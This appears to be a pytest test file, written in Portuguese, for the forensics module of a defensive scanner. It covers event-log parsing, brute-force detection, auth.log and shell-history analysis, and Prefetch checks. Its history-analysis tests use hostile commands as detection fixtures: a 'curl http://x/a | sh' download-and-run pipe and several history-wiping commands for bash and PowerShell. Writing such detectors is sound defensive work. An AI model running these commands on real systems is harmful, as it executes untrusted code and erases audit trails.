"""Artefatos forenses: parsing, análise e integração com o run_scan."""
import gzip
import importlib.util
import os
import subprocess
import sys
from datetime import datetime, timedelta
from pathlib import Path

import pytest

from dupin_scan import core, forensics as fx

LAB = Path(__file__).resolve().parent.parent / "lab" / "run_lab.py"
_spec = importlib.util.spec_from_file_location("run_lab", LAB)
lab = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(lab)
ev = lab.make_event

# Evento real (System/7045) capturado de um Windows em pt-BR; só o nome do computador foi trocado.
REAL_7045 = ("<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>"
             "<Provider Name='Service Control Manager' Guid='{555908d1-a6d7-4695-8e1e-26931d2012f4}' EventSourceName='Service Control Manager'/>"
             "<EventID Qualifiers='16384'>7045</EventID><Version>0</Version><Level>4</Level><Task>0</Task><Opcode>0</Opcode>"
             "<Keywords>0x8080000000000000</Keywords><TimeCreated SystemTime='2026-08-20T11:07:29.8995939Z'/>"
             "<EventRecordID>55271</EventRecordID><Correlation/><Execution ProcessID='1328' ThreadID='11516'/>"
             "<Channel>System</Channel><Computer>HOST</Computer><Security UserID='S-1-5-18'/></System>"
             "<EventData><Data Name='ServiceName'>IntelTACD</Data><Data Name='ImagePath'>C:\\Windows\\System32\\drivers\\IntelTACD.sys</Data>"
             "<Data Name='ServiceType'>driver de modo kernel</Data><Data Name='StartType'>iniciar demanda</Data>"
             "<Data Name='AccountName'></Data></EventData></Event>")

NOW = datetime(2026, 11, 11, 12, 0, 0)


# ------------------------------------------------------------ parse de eventos
def test_parse_events_com_evento_real():
    [e] = fx.parse_events(REAL_7045)
    assert (e["id"], e["channel"], e["record"]) == (7045, "System", "55271")
    assert e["data"]["ServiceName"] == "IntelTACD" and e["data"]["AccountName"] == ""
    assert e["time"].startswith("2026-08-20T11:07:29")


def test_parse_events_varios_e_caracteres_de_controle():
    texto = REAL_7045 + "\r\n" + REAL_7045.replace("55271", "55272") + "\x00"
    assert [e["record"] for e in fx.parse_events(texto)] == ["55271", "55272"]


def test_parse_events_userdata_do_1102():
    [e] = fx.parse_events(ev(1102, "Security", userdata={"SubjectUserName": "mallory"}))
    assert e["data"]["SubjectUserName"] == "mallory"


def test_parse_events_vazio():
    assert fx.parse_events("") == []


def test_xpath():
    q = fx._xpath((4625, 4624), 30, "Data[@Name='LogonType']='10'")
    assert q == ("*[System[(EventID=4625 or EventID=4624) and TimeCreated[timediff(@SystemTime) <= 2592000000]]"
                 " and EventData[Data[@Name='LogonType']='10']]")


@pytest.mark.skipif(os.name != "nt", reason="página de código ANSI só no Windows")
def test_decode_usa_a_pagina_ansi():
    import ctypes
    acp = f"cp{ctypes.windll.kernel32.GetACP()}"
    assert fx._decode("Informações".encode(acp)) == "Informações"
    assert fx._decode("Informações".encode("utf-8")) == "Informações"


# ------------------------------------------------------------ análise de eventos do Windows
def falhas(n, ip="8.8.8.8", t0="2026-11-10T12:00:00.0000000Z"):
    return [ev(4625, "Security", {"IpAddress": ip, "TargetUserName": "adm"}, time=t0, record=i) for i in range(n)]


def analisar(*xmls):
    return fx.analyze_windows_events(fx.parse_events("\n".join(xmls)))


def test_forca_bruta_exige_o_limite():
    assert analisar(*falhas(fx.BRUTE_THRESHOLD - 1)) == []
    [f] = analisar(*falhas(fx.BRUTE_THRESHOLD))
    assert f["failures"] == fx.BRUTE_THRESHOLD and [t["id"] for t in f["attack"]] == ["T1110"]
    assert f["score"] == 40


def test_login_depois_das_falhas_sobe_a_nota():
    ok = ev(4624, "Security", {"IpAddress": "8.8.8.8", "LogonType": "10", "TargetUserName": "adm"},
            time="2026-11-10T13:00:00.0000000Z")
    [f] = analisar(*falhas(10), ok)
    assert f["score"] == 80 and {t["id"] for t in f["attack"]} == {"T1110", "T1078"}


def test_login_antes_das_falhas_nao_conta():
    ok = ev(4624, "Security", {"IpAddress": "8.8.8.8", "LogonType": "10"}, time="2026-11-10T11:00:00.0000000Z")
    [f] = analisar(*falhas(10), ok)
    assert f["score"] == 40


def test_logon_interativo_nao_conta_como_sucesso():
    ok = ev(4624, "Security", {"IpAddress": "8.8.8.8", "LogonType": "2"}, time="2026-11-10T13:00:00.0000000Z")
    [f] = analisar(*falhas(10), ok)
    assert f["score"] == 40


def test_enderecos_locais_sao_ignorados():
    assert analisar(*falhas(20, ip="-"), *falhas(20, ip="::1"), *falhas(20, ip="127.0.0.1")) == []


def test_enderecos_diferentes_nao_se_somam():
    assert analisar(*falhas(6, ip="8.8.8.8"), *falhas(6, ip="8.8.4.4")) == []


def test_evento_de_canal_errado_nao_dispara():
    assert analisar(ev(1102, "Application", userdata={"SubjectUserName": "x"})) == []


def test_tarefa_4698_sem_nada_suspeito_nao_gera_achado():
    assert analisar(ev(4698, "Security", {"TaskContent": "<Command>C:\\Program Files\\App\\update.exe</Command>"})) == []


# ------------------------------------------------------------ windows_events (wevtutil simulado)
def test_windows_events_acesso_negado_e_avisado_uma_vez(monkeypatch):
    chamados = []

    def fake(channel, ids, days, limit, extra=None):
        chamados.append(channel)
        if channel == "Security":
            raise PermissionError(channel)
        return fx.parse_events(REAL_7045)

    monkeypatch.setattr(fx, "_query_events", fake)
    notes = []
    fx.windows_events(30, notes)
    assert chamados.count("Security") == 1  # não insiste nas outras consultas do mesmo canal
    assert len([n for n in notes if "Security" in n]) == 1 and "administrador" in notes[0]
    assert "System" in chamados and fx.PS_CHANNEL in chamados


def test_windows_events_avisa_truncamento(monkeypatch):
    monkeypatch.setattr(fx, "_query_events", lambda ch, ids, d, limit, extra=None: fx.parse_events(REAL_7045) * limit)
    notes = []
    fx.windows_events(30, notes)
    assert any("limite" in n for n in notes)


def test_windows_events_erro_do_wevtutil_vira_nota(monkeypatch):
    def fake(*a, **k):
        raise OSError("canal não encontrado")

    monkeypatch.setattr(fx, "_query_events", fake)
    notes = []
    assert fx.windows_events(30, notes) == []
    assert any("canal não encontrado" in n for n in notes)


@pytest.mark.skipif(os.name != "nt", reason="wevtutil só existe no Windows")
def test_wevtutil_real_canal_system():
    """Contra o Windows de verdade (somente leitura): a consulta e o parse funcionam."""
    try:
        eventos = fx._query_events("System", (7045,), 3650, 5)
    except PermissionError:
        pytest.skip("sem permissão para ler o log System")
    assert all(e["id"] == 7045 and e["channel"] == "System" and "ImagePath" in e["data"] for e in eventos)


# ------------------------------------------------------------ Linux: auth.log
def linha(dt, texto):
    return f"{lab._syslog_ts(dt)} srv {texto}"


def test_parse_ts_virada_de_ano():
    assert fx._parse_ts("Dec 31 23:59:59", datetime(2027, 1, 1, 0, 5)).year == 2026
    assert fx._parse_ts("Nov  9 08:00:00", NOW) == datetime(2026, 11, 9, 8, 0, 0)


def test_parse_ts_iso_e_invalido():
    assert fx._parse_ts("2026-11-10T12:00:00.123456789+00:00", NOW) is not None
    assert fx._parse_ts("Xyz 11 12:00:00", NOW) is None


def test_linux_auth_respeita_a_janela_de_dias(tmp_path):
    antigo = [linha(NOW - timedelta(days=40), f"sshd[1]: Failed password for root from 8.8.8.8 port {i} ssh2") for i in range(15)]
    log = tmp_path / "auth.log"
    log.write_text("\n".join(antigo) + "\n")
    assert fx.linux_auth(paths=[log], days=30, now=NOW) == []
    assert len(fx.linux_auth(paths=[log], days=90, now=NOW)) == 1


def test_linux_auth_le_log_rotacionado_gz(tmp_path):
    texto = "\n".join(linha(NOW - timedelta(hours=1), f"sshd[1]: Failed password for root from 8.8.8.8 port {i} ssh2")
                      for i in range(12)) + "\n"
    gz = tmp_path / "auth.log.2.gz"
    with gzip.open(gz, "wt") as f:
        f.write(texto)
    [f] = fx.linux_auth(paths=[gz], now=NOW)
    assert f["failures"] == 12


def test_linux_auth_grupo_nao_administrativo_e_ignorado(tmp_path):
    t = NOW - timedelta(hours=1)
    log = tmp_path / "auth.log"
    log.write_text("\n".join([
        linha(t, "usermod[1]: add 'joao' to group 'docker'"),
        linha(t, "gpasswd[2]: user bob added by root to group sudo"),
    ]) + "\n")
    [f] = fx.linux_auth(paths=[log], now=NOW)
    assert "bob" in f["reasons"][0] and f["attack"][0]["id"] == "T1098"


def test_linux_auth_sudo_comum_nao_gera_achado(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(linha(NOW - timedelta(hours=1), "sudo:    ana : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/bin/apt update") + "\n")
    assert fx.linux_auth(paths=[log], now=NOW) == []


def test_linux_auth_root_de_ip_interno_nao_gera_achado(tmp_path):
    log = tmp_path / "auth.log"
    log.write_text(linha(NOW - timedelta(hours=1), "sshd[1]: Accepted password for root from 192.168.0.9 port 22 ssh2") + "\n")
    assert fx.linux_auth(paths=[log], now=NOW) == []


def test_linux_auth_formato_iso_do_rsyslog(tmp_path):
    t = (NOW - timedelta(hours=1)).strftime("%Y-%m-%dT%H:%M:%S.123456+00:00")
    log = tmp_path / "auth.log"
    log.write_text("".join(f"{t} srv sshd[1]: Failed password for root from 8.8.8.8 port {i} ssh2\n" for i in range(10)))
    assert len(fx.linux_auth(paths=[log], now=NOW + timedelta(days=2), days=365)) == 1


def test_linux_auth_sem_logs_avisa(monkeypatch):
    monkeypatch.setattr(fx, "_default_auth_files", lambda: [])
    monkeypatch.setattr(fx, "journald_lines", lambda days, notes=None: None)  # sem isto, num Linux com journalctl leria o journal real
    notes = []
    assert fx.linux_auth(notes=notes) == [] and any("journald" in n for n in notes)


def test_linux_auth_arquivo_ilegivel_vira_nota(tmp_path):
    notes = []
    fx.linux_auth(paths=[tmp_path / "nao_existe.log"], notes=notes, now=NOW)
    assert any("nao_existe.log" in n for n in notes)


# ------------------------------------------------------------ históricos
def test_historico_bash_com_timestamp(tmp_path):
    (tmp_path / ".bash_history").write_text("#1700000000\ncurl http://x/a | sh\nls\n")
    [f] = fx.linux_history(homes=[tmp_path])
    assert f["when"].startswith("2023-11-1") and f["where"].endswith(".bash_history:2")


def test_historico_zsh_e_fish(tmp_path):
    (tmp_path / ".zsh_history").write_text(": 1700000100:0;history -c\n")
    fish = tmp_path / ".local" / "share" / "fish"
    fish.mkdir(parents=True)
    (fish / "fish_history").write_text("- cmd: curl http://x/a | sh\n  when: 1700000200\n")
    reasons = sorted(f["reasons"][0] for f in fx.linux_history(homes=[tmp_path]))
    assert any("history -c" in r for r in reasons) and any("Download" in r for r in reasons)


@pytest.mark.parametrize("cmd", ["unset HISTFILE", "export HISTSIZE=0", "HISTFILE=/dev/null", "rm ~/.bash_history",
                                 "shred -u ~/.bash_history", "ln -sf /dev/null ~/.bash_history"])
def test_historico_limpeza_linux(tmp_path, cmd):
    (tmp_path / ".bash_history").write_text(cmd + "\n")
    [f] = fx.linux_history(homes=[tmp_path])
    assert f["attack"][0]["id"] == "T1070.003"


def test_historico_comandos_comuns_nao_geram_achado(tmp_path):
    (tmp_path / ".bash_history").write_text("ls -la /tmp/\ncd /var/tmp/\nhistory\ncat ~/.bash_history | wc -l\n")
    assert fx.linux_history(homes=[tmp_path]) == []  # 'caminho temporário' sozinho é ruído e fica de fora


def test_historico_symlink_para_dev_null(tmp_path):
    try:
        os.symlink("/dev/null", tmp_path / ".bash_history")
    except (OSError, NotImplementedError):
        pytest.skip("sem permissão para criar symlink")
    if os.name == "nt":
        pytest.skip("o alvo /dev/null só faz sentido em POSIX")
    assert any("/dev/null" in r for f in fx.linux_history(homes=[tmp_path]) for r in f["reasons"])


def test_historico_ilegivel_vira_nota(tmp_path, monkeypatch):
    (tmp_path / ".bash_history").write_text("ls\n")

    def negado(*a, **k):
        raise PermissionError("negado")

    monkeypatch.setattr(Path, "read_text", negado)
    notes = []
    assert fx.linux_history(homes=[tmp_path], notes=notes) == []
    assert any("ilegível" in n for n in notes)


@pytest.mark.parametrize("cmd", ["Clear-History", "Set-PSReadLineOption -HistorySaveStyle SaveNothing",
                                 "Remove-Item $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"])
def test_historico_powershell_limpeza(tmp_path, cmd):
    p = tmp_path / "ConsoleHost_history.txt"
    p.write_text(cmd + "\n")
    [f] = fx.windows_history(paths=[p])
    assert f["attack"][0]["id"] == "T1070.003"


def test_historico_powershell_deduplica_caminhos(tmp_path):
    p = tmp_path / "h.txt"
    p.write_text("Clear-History\n")
    assert len(fx.windows_history(paths=[p, p])) == 1


# ------------------------------------------------------------ Prefetch
def test_prefetch_ignora_nomes_fora_do_padrao_e_marca_data(tmp_path):
    (tmp_path / "MIMIKATZ.EXE-1A2B3C4D.pf").write_bytes(b"")
    (tmp_path / "nome-estranho.pf").write_bytes(b"")
    (tmp_path / "leiame.txt").write_text("x")
    [f] = fx.windows_prefetch(directory=tmp_path)
    assert f["source"] == "Prefetch" and f["when"] and "1A2B3C4D" in f["detail"]
    assert f["attack"][0]["id"] == "T1003.001"


def test_prefetch_pasta_inexistente_e_sem_permissao(tmp_path, monkeypatch):
    notes = []
    assert fx.windows_prefetch(directory=tmp_path / "x", notes=notes) == [] and "inexistente" in notes[0]
    monkeypatch.setattr(os, "listdir", lambda p: (_ for _ in ()).throw(PermissionError()))
    notes = []
    fx.windows_prefetch(directory=tmp_path, notes=notes)
    assert "administrador" in notes[0]


def test_prefetch_vazio_avisa(tmp_path):
    notes = []
    fx.windows_prefetch(directory=tmp_path, notes=notes)
    assert "vazia" in notes[0]


# ------------------------------------------------------------ orquestração e run_scan
def test_run_forensics_escolhe_os_passos_por_so(monkeypatch):
    chamados = []
    for nome in ("windows_events", "windows_history", "windows_prefetch", "linux_auth", "linux_history"):
        monkeypatch.setattr(fx, nome, lambda *a, _n=nome, **k: chamados.append(_n) or [])
    fx.run_forensics("windows")
    assert chamados == ["windows_events", "windows_history", "windows_prefetch"]
    chamados.clear()
    fx.run_forensics("linux")
    assert chamados == ["linux_auth", "linux_history"]


def test_run_forensics_respeita_cancelamento(monkeypatch):
    monkeypatch.setattr(fx, "linux_auth", lambda *a, **k: pytest.fail("não deveria rodar"))
    assert fx.run_forensics("linux", cancelled=lambda: True) == []


def test_run_scan_inclui_forense_e_define_gravidade(monkeypatch):
    achado = core.finding("artifact", "x", [("teste", 85)], source="t", when="")
    monkeypatch.setattr(fx, "run_forensics", lambda os_name, days, notes, cancelled: notes.append("aviso") or [achado])
    rep = core.run_scan(modules=("forensics",))
    assert [f["level"] for f in rep["findings"]] == ["ALTO"] and "aviso" in rep["notes"]


def test_run_scan_forense_com_erro_vira_nota(monkeypatch):
    def boom(*a, **k):
        raise RuntimeError("falhou")

    monkeypatch.setattr(fx, "run_forensics", boom)
    rep = core.run_scan(modules=("forensics",))
    assert rep["findings"] == [] and any("falhou" in n for n in rep["notes"])


def test_run_scan_forense_ignorada_se_so_difere_do_host(monkeypatch):
    other = "linux" if core.host_os() == "windows" else "windows"
    monkeypatch.setattr(fx, "run_forensics", lambda *a, **k: pytest.fail("não deveria rodar"))
    assert core.run_scan(os_name=other, modules=("forensics",))["findings"] == []
